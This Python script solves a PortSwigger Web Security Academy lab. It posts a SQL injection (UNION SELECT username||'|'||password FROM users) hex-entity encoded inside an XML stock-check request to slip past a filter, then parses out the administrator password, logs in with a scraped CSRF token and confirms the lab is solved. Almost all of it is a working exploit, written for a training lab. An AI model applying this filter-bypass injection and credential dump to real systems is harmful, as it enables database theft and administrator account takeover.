import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: SQL injection with filter bypass via XML encoding')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# INJECT "UNION SELECT username||('|')||password FROM users-- -" HEX ENTITY ENCODED
XHEADER = '<?xml version="1.0" encoding="UTF-8"?>'
xxe = "<stockCheck><productId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x7c;&#x7c;&#x28;&#x27;&#x7c;&#x27;&#x29;&#x7c;&#x7c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x2d;&#x2d;&#x20;&#x2d;</productId><storeId>1</storeId></stockCheck>"

r = requests.post("https://" + lab.id + ".web-security-academy.net/product/stock", data=f"{XHEADER}{xxe}")

password = re.search(r'administrator\|(.*)', r.text).group(1)

# AUTH AS ADMINISTRATOR
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
headers = {"Cookie": f"session={r.cookies.get('session')}"}
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)

r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"administrator","password":password}, allow_redirects=False)

administrator = r.cookies.get('session')
headers = {"Cookie":f"session={administrator}"}
requests.get("https://" + lab.id + ".web-security-academy.net/my-account", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")